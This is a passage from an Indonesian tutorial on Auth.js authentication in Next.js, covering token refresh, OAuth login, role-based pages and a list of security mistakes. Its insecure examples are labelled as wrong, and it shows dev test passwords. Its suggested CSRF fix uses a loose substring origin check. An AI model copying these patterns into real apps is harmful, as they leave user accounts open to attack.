    if (account && user) {
      return {
        ...token,
        id:               user.id as string,
        role:             (user as { role?: string }).role ?? "user",
        accessToken:      account.access_token,
        accessTokenExpires: account.expires_at
          ? account.expires_at * 1000  // Convert ke milliseconds
          : Date.now() + 15 * 60 * 1000, // Default: 15 menit
        refreshToken:     account.refresh_token,
      };
    }

    // Token masih valid → return as-is
    if (Date.now() < (token.accessTokenExpires as number)) {
      return token;
    }

    // Access token expired → refresh
    return await refreshAccessToken(token);
  },

  async session({ session, token }) {
    session.user.id          = token.id as string;
    session.user.role        = token.role as string;
    session.error            = token.error as string | undefined;
    return session;
  },
},
```

```ts
// Fungsi refresh token
async function refreshAccessToken(token: JWT): Promise<JWT> {
  try {
    // URL refresh token masing-masing provider berbeda
    const response = await fetch("https://oauth2.googleapis.com/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        client_id:     process.env.AUTH_GOOGLE_ID!,
        client_secret: process.env.AUTH_GOOGLE_SECRET!,
        grant_type:    "refresh_token",
        refresh_token: token.refreshToken as string,
      }),
    });

    const refreshed = await response.json();

    if (!response.ok) throw refreshed;

    return {
      ...token,
      accessToken:        refreshed.access_token,
      accessTokenExpires: Date.now() + refreshed.expires_in * 1000,
      // Kalau Google beri refresh token baru, update
      refreshToken: refreshed.refresh_token ?? token.refreshToken,
      error: undefined, // Hapus error sebelumnya
    };
  } catch (error) {
    console.error("Error refreshing access token:", error);

    // Tandai dengan error — bisa dihandle di client untuk force logout
    return {
      ...token,
      error: "RefreshAccessTokenError",
    };
  }
}
```

```tsx
// Di client: handle RefreshAccessTokenError → force logout
"use client";

import { useSession, signOut } from "next-auth/react";
import { useEffect } from "react";

export function SessionGuard({ children }: { children: React.ReactNode }) {
  const { data: session } = useSession();

  useEffect(() => {
    // Kalau ada error refresh token → logout user
    if (session?.error === "RefreshAccessTokenError") {
      signOut({ callbackUrl: "/login?error=session_expired" });
    }
  }, [session]);

  return <>{children}</>;
}
```

---

## 10. Mini Project: Auth Lengkap dengan Google + RBAC

Kita bangun sistem auth lengkap dengan:
- Login dengan Google
- Login dengan Email/Password
- Dashboard yang protected
- Halaman admin yang hanya bisa diakses admin
- Tampilkan konten berbeda berdasarkan role
- Proper logout

### Struktur Project

```
.
├── auth.ts
├── middleware.ts
├── types/
│   └── next-auth.d.ts
├── lib/
│   └── rbac.ts
├── app/
│   ├── layout.tsx                   ← Root layout dengan SessionProvider
│   ├── page.tsx                     ← Landing page (public)
│   ├── login/
│   │   └── page.tsx                 ← Halaman login
│   ├── (protected)/
│   │   ├── layout.tsx               ← Layout untuk semua halaman protected
│   │   ├── dashboard/
│   │   │   └── page.tsx
│   │   ├── profile/
│   │   │   └── page.tsx
│   │   └── admin/
│   │       ├── layout.tsx           ← Admin-only check tambahan
│   │       └── page.tsx
│   └── api/
│       └── auth/
│           └── [...nextauth]/
│               └── route.ts
└── components/
    ├── auth/
    │   ├── LoginForm.tsx
    │   ├── LogoutButton.tsx
    │   └── PermissionGuard.tsx
    └── layout/
        └── Navbar.tsx
```

### Landing Page (Public)

```tsx
// app/page.tsx
import Link from "next/link";
import { auth } from "@/auth";

export default async function LandingPage() {
  const session = await auth();

  return (
    <main className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100">
      <div className="container mx-auto px-4 py-16 text-center">
        <h1 className="text-5xl font-bold text-gray-900 mb-6">
          Selamat Datang di MyApp 👋
        </h1>
        <p className="text-xl text-gray-600 mb-10 max-w-2xl mx-auto">
          Platform modern dengan sistem auth yang aman dan role-based access control.
        </p>

        {session ? (
          // Sudah login
          <div className="flex flex-col items-center gap-4">
            <p className="text-gray-600">
              Hai, <strong>{session.user.name}</strong>!
              Kamu login sebagai{" "}
              <span className="font-bold text-blue-600">{session.user.role}</span>
            </p>
            <div className="flex gap-4">
              <Link
                href="/dashboard"
                className="px-6 py-3 bg-blue-600 text-white rounded-xl font-semibold hover:bg-blue-700 transition"
              >
                Buka Dashboard →
              </Link>
              {session.user.role === "admin" && (
                <Link
                  href="/admin"
                  className="px-6 py-3 bg-purple-600 text-white rounded-xl font-semibold hover:bg-purple-700 transition"
                >
                  Admin Panel →
                </Link>
              )}
            </div>
          </div>
        ) : (
          // Belum login
          <div className="flex gap-4 justify-center">
            <Link
              href="/login"
              className="px-8 py-3 bg-blue-600 text-white rounded-xl font-semibold text-lg hover:bg-blue-700 transition"
            >
              Masuk
            </Link>
            <Link
              href="/register"
              className="px-8 py-3 bg-white text-blue-600 border-2 border-blue-600 rounded-xl font-semibold text-lg hover:bg-blue-50 transition"
            >
              Daftar
            </Link>
          </div>
        )}
      </div>
    </main>
  );
}
```

### Halaman Login

```tsx
// app/login/page.tsx
import type { Metadata } from "next";
import { auth } from "@/auth";
import { redirect } from "next/navigation";
import LoginForm from "@/components/auth/LoginForm";

export const metadata: Metadata = {
  title: "Masuk",
};

interface LoginPageProps {
  searchParams: Promise<{ callbackUrl?: string; error?: string }>;
}

export default async function LoginPage({ searchParams }: LoginPageProps) {
  const session = await auth();
  const params  = await searchParams;

  // Sudah login → redirect ke dashboard atau callbackUrl
  if (session) {
    redirect(params.callbackUrl ?? "/dashboard");
  }

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center px-4">
      <div className="w-full max-w-md">
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-8">
          <div className="text-center mb-8">
            <h1 className="text-2xl font-bold text-gray-900">Masuk ke Akun</h1>
            <p className="text-gray-500 mt-1 text-sm">
              Pilih cara login yang kamu inginkan
            </p>
          </div>

          <LoginForm
            callbackUrl={params.callbackUrl}
            error={params.error}
          />
        </div>
      </div>
    </div>
  );
}
```

```tsx
// components/auth/LoginForm.tsx
"use client";

import { signIn } from "next-auth/react";
import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";

const loginSchema = z.object({
  email:    z.string().email("Format email tidak valid"),
  password: z.string().min(1, "Password wajib diisi"),
});
type LoginValues = z.infer<typeof loginSchema>;

// Pesan error dari NextAuth diterjemahkan ke Bahasa Indonesia
const ERROR_MESSAGES: Record<string, string> = {
  OAuthSignin:       "Terjadi kesalahan saat memulai proses login.",
  OAuthCallback:     "Terjadi kesalahan saat proses OAuth.",
  OAuthCreateAccount:"Tidak bisa membuat akun. Email mungkin sudah terdaftar.",
  EmailCreateAccount:"Tidak bisa membuat akun dengan email ini.",
  Callback:          "Terjadi kesalahan pada proses callback.",
  OAuthAccountNotLinked:
                     "Email ini sudah terdaftar dengan metode login berbeda. Gunakan metode login sebelumnya.",
  CredentialsSignin: "Email atau password salah.",
  SessionRequired:   "Kamu harus login untuk mengakses halaman ini.",
  default:           "Terjadi kesalahan. Silakan coba lagi.",
};

interface LoginFormProps {
  callbackUrl?: string;
  error?:       string;
}

export default function LoginForm({ callbackUrl, error }: LoginFormProps) {
  const [isLoadingGoogle, setIsLoadingGoogle] = useState(false);
  const [isLoadingGitHub, setIsLoadingGitHub] = useState(false);

  const {
    register,
    handleSubmit,
    formState: { errors, isSubmitting },
    setError,
  } = useForm<LoginValues>({ resolver: zodResolver(loginSchema) });

  // Error dari URL query parameter (redirect dari NextAuth)
  const urlError = error ? (ERROR_MESSAGES[error] ?? ERROR_MESSAGES.default) : null;

  const handleGoogleLogin = async (): Promise<void> => {
    setIsLoadingGoogle(true);
    await signIn("google", { callbackUrl: callbackUrl ?? "/dashboard" });
    // Loading state tetap true sampai redirect terjadi
  };

  const handleGitHubLogin = async (): Promise<void> => {
    setIsLoadingGitHub(true);
    await signIn("github", { callbackUrl: callbackUrl ?? "/dashboard" });
  };

  const onSubmit = async (data: LoginValues): Promise<void> => {
    const result = await signIn("credentials", {
      email:       data.email,
      password:    data.password,
      redirect:    false,    // Kalau redirect: true, NextAuth handle sendiri dengan redirect
      callbackUrl: callbackUrl ?? "/dashboard",
    });

    if (!result?.ok) {
      // Taruh error di field email (atau bisa di state terpisah)
      setError("email", {
        type:    "server",
        message: ERROR_MESSAGES.CredentialsSignin,
      });
      return;
    }

    // Redirect manual setelah login berhasil
    window.location.href = result.url ?? "/dashboard";
  };

  return (
    <div className="space-y-4">
      {/* Error dari URL */}
      {urlError && (
        <div className="p-3 bg-red-50 border border-red-200 rounded-lg text-sm text-red-700">
          ⚠️ {urlError}
        </div>
      )}

      {/* OAuth Buttons */}
      <button
        type="button"
        onClick={handleGoogleLogin}
        disabled={isLoadingGoogle || isSubmitting || isLoadingGitHub}
        className="w-full flex items-center justify-center gap-3 px-4 py-2.5 border border-gray-300 rounded-xl hover:bg-gray-50 transition font-medium text-gray-700 disabled:opacity-60 disabled:cursor-not-allowed"
      >
        {isLoadingGoogle ? (
          <span className="w-5 h-5 border-2 border-gray-400 border-t-gray-700 rounded-full animate-spin" />
        ) : (
          <svg viewBox="0 0 24 24" className="w-5 h-5">
            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
          </svg>
        )}
        {isLoadingGoogle ? "Mengarahkan..." : "Lanjutkan dengan Google"}
      </button>

      <button
        type="button"
        onClick={handleGitHubLogin}
        disabled={isLoadingGoogle || isSubmitting || isLoadingGitHub}
        className="w-full flex items-center justify-center gap-3 px-4 py-2.5 bg-gray-900 text-white rounded-xl hover:bg-black transition font-medium disabled:opacity-60 disabled:cursor-not-allowed"
      >
        {isLoadingGitHub ? (
          <span className="w-5 h-5 border-2 border-gray-600 border-t-white rounded-full animate-spin" />
        ) : (
          <svg viewBox="0 0 24 24" fill="currentColor" className="w-5 h-5">
            <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
          </svg>
        )}
        {isLoadingGitHub ? "Mengarahkan..." : "Lanjutkan dengan GitHub"}
      </button>

      {/* Divider */}
      <div className="flex items-center gap-3">
        <div className="flex-1 h-px bg-gray-200" />
        <span className="text-xs text-gray-400 font-medium">atau</span>
        <div className="flex-1 h-px bg-gray-200" />
      </div>

      {/* Email/Password Form */}
      <form onSubmit={handleSubmit(onSubmit)} noValidate className="space-y-3">
        <div>
          <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-1">
            Email
          </label>
          <input
            id="email"
            type="email"
            autoComplete="email"
            placeholder="nama@email.com"
            className={`w-full px-3 py-2.5 rounded-lg border text-sm focus:outline-none focus:ring-2 transition ${
              errors.email
                ? "border-red-400 focus:ring-red-300"
                : "border-gray-300 focus:ring-blue-300"
            }`}
            {...register("email")}
          />
          {errors.email && (
            <p className="mt-1 text-xs text-red-600">{errors.email.message}</p>
          )}
        </div>

        <div>
          <div className="flex justify-between items-center mb-1">
            <label htmlFor="password" className="block text-sm font-medium text-gray-700">
              Password
            </label>
            <a href="/forgot-password" className="text-xs text-blue-600 hover:underline">
              Lupa password?
            </a>
          </div>
          <input
            id="password"
            type="password"
            autoComplete="current-password"
            placeholder="••••••••"
            className={`w-full px-3 py-2.5 rounded-lg border text-sm focus:outline-none focus:ring-2 transition ${
              errors.password
                ? "border-red-400 focus:ring-red-300"
                : "border-gray-300 focus:ring-blue-300"
            }`}
            {...register("password")}
          />
          {errors.password && (
            <p className="mt-1 text-xs text-red-600">{errors.password.message}</p>
          )}
        </div>

        <button
          type="submit"
          disabled={isSubmitting || isLoadingGoogle || isLoadingGitHub}
          className="w-full py-2.5 bg-blue-600 text-white rounded-xl font-semibold text-sm hover:bg-blue-700 transition disabled:opacity-60 disabled:cursor-not-allowed mt-1"
        >
          {isSubmitting ? "Memverifikasi..." : "Masuk dengan Email"}
        </button>
      </form>

      <p className="text-center text-sm text-gray-500">
        Belum punya akun?{" "}
        <a href="/register" className="text-blue-600 font-medium hover:underline">
          Daftar gratis
        </a>
      </p>

      {/* Test accounts */}
      {process.env.NODE_ENV === "development" && (
        <div className="mt-4 p-3 bg-amber-50 border border-amber-200 rounded-lg text-xs text-amber-700">
          <p className="font-semibold mb-1">Dev Mode — Test Accounts:</p>
          <p>Admin: admin@mail.com / password123</p>
          <p>User:  user@mail.com / password123</p>
        </div>
      )}
    </div>
  );
}
```

### Protected Layout

```tsx
// app/(protected)/layout.tsx
import { auth } from "@/auth";
import { redirect } from "next/navigation";
import Navbar from "@/components/layout/Navbar";

export default async function ProtectedLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  const session = await auth();

  if (!session) {
    redirect("/login");
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <Navbar user={session.user} />
      <main className="container mx-auto px-4 py-8 max-w-6xl">
        {children}
      </main>
    </div>
  );
}
```

### Dashboard Page

```tsx
// app/(protected)/dashboard/page.tsx
import type { Metadata } from "next";
import { auth } from "@/auth";
import { PermissionGuard } from "@/components/auth/PermissionGuard";

export const metadata: Metadata = { title: "Dashboard" };

export default async function DashboardPage() {
  const session = await auth();

  return (
    <div className="space-y-6">
      {/* Header */}
      <div>
        <h1 className="text-2xl font-bold text-gray-900">
          Selamat datang kembali, {session?.user.name?.split(" ")[0]}! 👋
        </h1>
        <p className="text-gray-500 mt-1">
          Kamu login sebagai{" "}
          <span className={`font-semibold ${
            session?.user.role === "admin" ? "text-purple-600" : "text-blue-600"
          }`}>
            {session?.user.role}
          </span>
        </p>
      </div>

      {/* Stats cards — tampil untuk semua user */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        <StatCard title="Total Post" value="24" icon="📝" />
        <StatCard title="Total Views" value="1.2K" icon="👁️" />
        <StatCard title="Komentar" value="38" icon="💬" />
      </div>

      {/* Hanya admin dan moderator yang lihat ini */}
      <PermissionGuard permission="analytics:view">
        <div className="bg-white rounded-xl border p-6">
          <h2 className="font-semibold text-gray-900 mb-4">Analytics Overview</h2>
          <p className="text-gray-500 text-sm">
            Section ini hanya terlihat untuk admin dan moderator.
          </p>
        </div>
      </PermissionGuard>

      {/* Hanya admin */}
      <PermissionGuard permission="users:view">
        <div className="bg-white rounded-xl border p-6">
          <h2 className="font-semibold text-gray-900 mb-2">Manajemen User</h2>
          <p className="text-gray-500 text-sm">
            Section ini hanya terlihat untuk admin.
          </p>
          <PermissionGuard
            permission="users:create"
            fallback={
              <button disabled className="mt-4 px-4 py-2 bg-gray-100 text-gray-400 rounded-lg text-sm cursor-not-allowed">
                Tambah User (Perlu Izin)
              </button>
            }
          >
            <button className="mt-4 px-4 py-2 bg-blue-600 text-white rounded-lg text-sm hover:bg-blue-700 transition">
              + Tambah User
            </button>
          </PermissionGuard>
        </div>
      </PermissionGuard>
    </div>
  );
}

function StatCard({ title, value, icon }: { title: string; value: string; icon: string }) {
  return (
    <div className="bg-white rounded-xl border p-5">
      <div className="flex items-center justify-between">
        <div>
          <p className="text-sm text-gray-500">{title}</p>
          <p className="text-2xl font-bold text-gray-900 mt-1">{value}</p>
        </div>
        <span className="text-3xl">{icon}</span>
      </div>
    </div>
  );
}
```

### Admin Page

```tsx
// app/(protected)/admin/page.tsx
import type { Metadata } from "next";
import { auth } from "@/auth";
import { redirect } from "next/navigation";

export const metadata: Metadata = { title: "Admin Panel" };

export default async function AdminPage() {
  const session = await auth();

  // Double-check role (middleware sudah handle, ini extra safety)
  if (session?.user.role !== "admin") {
    redirect("/dashboard");
  }

  return (
    <div className="space-y-6">
      <div className="flex items-center gap-3">
        <span className="text-3xl">🛡️</span>
        <div>
          <h1 className="text-2xl font-bold text-gray-900">Admin Panel</h1>
          <p className="text-gray-500 text-sm">
            Halaman ini hanya dapat diakses oleh admin
          </p>
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <AdminCard
          title="Kelola Users"
          description="Lihat, edit, dan hapus akun user"
          icon="👥"
          href="/admin/users"
        />
        <AdminCard
          title="Kelola Konten"
          description="Moderasi post dan komentar"
          icon="📋"
          href="/admin/content"
        />
        <AdminCard
          title="Pengaturan Sistem"
          description="Konfigurasi aplikasi"
          icon="⚙️"
          href="/admin/settings"
        />
        <AdminCard
          title="Audit Log"
          description="Riwayat aktivitas semua user"
          icon="📊"
          href="/admin/logs"
        />
      </div>
    </div>
  );
}

function AdminCard({ title, description, icon, href }: {
  title:       string;
  description: string;
  icon:        string;
  href:        string;
}) {
  return (
    <a
      href={href}
      className="group bg-white rounded-xl border p-5 hover:border-purple-300 hover:shadow-sm transition"
    >
      <span className="text-2xl">{icon}</span>
      <h3 className="font-semibold text-gray-900 mt-3 group-hover:text-purple-600 transition">
        {title}
      </h3>
      <p className="text-sm text-gray-500 mt-1">{description}</p>
    </a>
  );
}
```

### Navbar

```tsx
// components/layout/Navbar.tsx
"use client";

import Link from "next/link";
import { usePathname } from "next/navigation";
import { signOut } from "next-auth/react";
import type { Session } from "next-auth";

interface NavbarProps {
  user: Session["user"];
}

export default function Navbar({ user }: NavbarProps) {
  const pathname = usePathname();

  const navItems = [
    { label: "Dashboard", href: "/dashboard" },
    { label: "Profil",    href: "/profile"   },
    // Hanya tampil untuk admin
    ...(user.role === "admin" ? [{ label: "Admin Panel", href: "/admin" }] : []),
  ];

  return (
    <nav className="bg-white border-b sticky top-0 z-40">
      <div className="container mx-auto px-4 max-w-6xl flex items-center justify-between h-16">
        {/* Logo */}
        <Link href="/" className="font-bold text-gray-900 text-lg">
          MyApp
        </Link>

        {/* Nav links */}
        <div className="hidden md:flex items-center gap-1">
          {navItems.map(item => (
            <Link
              key={item.href}
              href={item.href}
              className={`px-4 py-2 rounded-lg text-sm font-medium transition ${
                pathname.startsWith(item.href)
                  ? "bg-blue-50 text-blue-700"
                  : "text-gray-600 hover:bg-gray-100"
              }`}
            >
              {item.label}
              {item.href === "/admin" && (
                <span className="ml-1.5 px-1.5 py-0.5 bg-purple-100 text-purple-700 rounded text-xs">
                  Admin
                </span>
              )}
            </Link>
          ))}
        </div>

        {/* User menu */}
        <div className="flex items-center gap-3">
          <div className="text-right hidden md:block">
            <p className="text-sm font-medium text-gray-900 leading-none">
              {user.name}
            </p>
            <p className="text-xs text-gray-500 mt-0.5">{user.email}</p>
          </div>
          <img
            src={user.image ?? `https://ui-avatars.com/api/?name=${encodeURIComponent(user.name ?? "User")}&background=3b82f6&color=fff`}
            alt={user.name ?? "Avatar"}
            className="w-9 h-9 rounded-full border-2 border-gray-200"
          />
          <button
            onClick={() => signOut({ callbackUrl: "/" })}
            className="text-sm text-gray-500 hover:text-red-600 transition font-medium"
          >
            Keluar
          </button>
        </div>
      </div>
    </nav>
  );
}
```

### Setup Google OAuth

```
1. Buka https://console.cloud.google.com
2. Buat project baru (atau pilih yang ada)
3. APIs & Services → OAuth consent screen
   - User type: External
   - Isi app name, email, dll.
4. APIs & Services → Credentials
   → Create Credentials → OAuth client ID
   → Application type: Web application
   → Authorized redirect URIs:
      http://localhost:3000/api/auth/callback/google   (dev)
      https://yourapp.com/api/auth/callback/google     (prod)
5. Copy Client ID → AUTH_GOOGLE_ID
   Copy Client Secret → AUTH_GOOGLE_SECRET
```

### Setup GitHub OAuth

```
1. Buka https://github.com/settings/developers
2. OAuth Apps → New OAuth App
3. Isi:
   - Application name: MyApp
   - Homepage URL: http://localhost:3000
   - Authorization callback URL:
     http://localhost:3000/api/auth/callback/github  (dev)
     https://yourapp.com/api/auth/callback/github    (prod)
4. Generate client secret
5. Copy Client ID → AUTH_GITHUB_ID
   Copy Client Secret → AUTH_GITHUB_SECRET
```

### Jalankan Project

```bash
npm run dev
# Buka http://localhost:3000

# Test flow:
# 1. Coba akses /dashboard tanpa login → redirect ke /login
# 2. Login dengan Google (perlu setup OAuth)
# 3. Login dengan email: admin@mail.com / password123
# 4. Akses /admin → berhasil
# 5. Login sebagai user@mail.com / password123
# 6. Coba akses /admin → redirect ke /dashboard
# 7. Klik Keluar → redirect ke landing page
```

---

## 11. Security Mistakes yang Sering Bikin Celah

### ❌ Simpan Token di localStorage

```ts
// ❌ Do NOT — rentan XSS
localStorage.setItem("token", jwtToken);
sessionStorage.setItem("user", JSON.stringify(userData));

// ✅ Biarkan Auth.js yang simpan di httpOnly cookie
// Tidak perlu kode apa-apa — otomatis aman
```

---

### ❌ Taruh Sensitive Data di JWT Payload

```ts
// ❌ JWT payload bisa dibaca dengan base64 decode — BUKAN secret
jwt.sign({
  userId:         user.id,
  email:          user.email,
  passwordHash:   user.passwordHash, // ← JANGAN!
  creditCardNumber: user.card,       // ← JANGAN!
  ssn:            user.ssn,          // ← JANGAN!
})

// ✅ Hanya taruh identifier dan data non-sensitive
jwt.sign({
  userId:  user.id,
  email:   user.email,
  role:    user.role,
})
```

---

### ❌ Cuma Proteksi di Frontend

```tsx
// ❌ Ini saja tidak cukup — user bisa bypass dari curl/Postman
export default function AdminPage() {
  const { data: session } = useSession();
  if (session?.user.role !== "admin") return <div>Forbidden</div>;
  return <AdminContent />;
}

// ✅ Proteksi harus ada di SEMUA lapisan:
// Layer 1: Middleware (redirect sebelum render)
// Layer 2: Server Component / Layout (redirect + tidak fetch data)
// Layer 3: API Route (return 401/403 kalau tidak authorized)
// Layer 4: Database level (Row-Level Security kalau pakai Supabase/Postgres)
```

---

### ❌ Tidak Validate CSRF di Form

```tsx
// ❌ Form yang kirim ke server tanpa CSRF token
// (di Next.js App Router dengan Server Action, sudah ada proteksi bawaan)
// Tapi kalau kamu buat custom API route untuk form submission:

// ❌ API route tanpa CSRF protection
export async function POST(request: Request) {
  const data = await request.json();
  // Langsung proses tanpa cek origin
}

// ✅ Check origin atau pakai SameSite cookie (Auth.js sudah lakukan ini)
// Untuk custom API, cek header:
export async function POST(request: Request) {
  const origin = request.headers.get("origin");
  const host   = request.headers.get("host");

  if (origin && !origin.includes(host ?? "")) {
    return Response.json({ error: "Forbidden" }, { status: 403 });
  }
  // Process...
}
```

---

### ❌ Expose Error Detail ke User

```ts
// ❌ Jangan beritahu detail error ke user
try {
  const user = await db.user.findUnique({ where: { email } });
  if (!user) throw new Error("User dengan email ini tidak ditemukan"); // ← Info bocor!
  // ...
} catch (err) {
  return { error: err.message }; // User tahu email tidak ada → bisa enumerate users
}

// ✅ Error generic untuk auth
try {
  const user = await db.user.findUnique({ where: { email } });
  const isValid = user && await bcrypt.compare(password, user.passwordHash);
  if (!isValid) {
    return { error: "Email atau password salah" }; // Tidak beritahu yang mana
  }
} catch {
  return { error: "Terjadi kesalahan. Silakan coba lagi." };
}
```

---

### ❌ Tidak Ada Rate Limiting di Login

```ts
// ❌ Tanpa rate limiting, penyerang bisa brute force password
// Loop kirim request login tanpa hambatan

// ✅ Tambahkan rate limiting
// Pakai library: @upstash/ratelimit (edge-compatible), atau express-rate-limit

// Contoh dengan Upstash Ratelimit:
import { Ratelimit } from "@upstash/ratelimit";
import { Redis } from "@upstash/redis";

const ratelimit = new Ratelimit({
  redis:     Redis.fromEnv(),
  limiter:   Ratelimit.slidingWindow(5, "15 m"), // 5 percobaan per 15 menit
  analytics: true,
});

// Di API route atau middleware login:
const ip = request.headers.get("x-forwarded-for") ?? "127.0.0.1";
const { success, limit, reset, remaining } = await ratelimit.limit(
  `login:${ip}`
);

if (!success) {
  return Response.json(
    { error: `Terlalu banyak percobaan login. Coba lagi dalam ${Math.ceil((reset - Date.now()) / 1000 / 60)} menit.` },
    {
      status:  429,
      headers: {
        "X-RateLimit-Limit":     limit.toString(),
        "X-RateLimit-Remaining": remaining.toString(),
        "X-RateLimit-Reset":     reset.toString(),
      }
    }
  );
}
```

---

### ❌ AUTH_SECRET yang Lemah

```bash
# ❌ Jangan gunakan secret yang mudah ditebak atau pendek
AUTH_SECRET="mysecret"
AUTH_SECRET="123456"
AUTH_SECRET="development"

# ✅ Generate random secret yang kuat
npx auth secret
# Output: AUTH_SECRET="base64url-encoded-32-bytes-random-string"

# Atau generate manual:
openssl rand -base64 32
```

---

### Checklist Security Auth

```
Sebelum deploy ke production, pastikan:

Cookie & Token:
  ☐ Token disimpan di httpOnly cookie (tidak localStorage)
  ☐ Cookie punya Secure flag (https only)
  ☐ SameSite=Lax atau Strict
  ☐ Token expiry yang reasonable (bukan 100 tahun)

Validasi:
  ☐ Validasi input di server (tidak hanya client)
  ☐ Semua API route punya auth check
  ☐ RBAC check di API level, bukan cuma UI level
  ☐ Re-validasi data dari user di setiap mutation

Secret Management:
  ☐ AUTH_SECRET yang kuat dan random
  ☐ Semua secret di environment variable (tidak di code)
  ☐ .env.local ada di .gitignore

Attack Protection:
  ☐ Rate limiting di endpoint login/register
  ☐ Error messages yang generic (tidak bocor info)
  ☐ HTTPS di production
  ☐ OAuth redirect URIs yang tepat (tidak wildcard)
```

---

*Dokumen ini adalah bagian dari seri **Frontend Mindset**. | TypeScript 5.x + React 18+ + Next.js 15 + Auth.js v5*
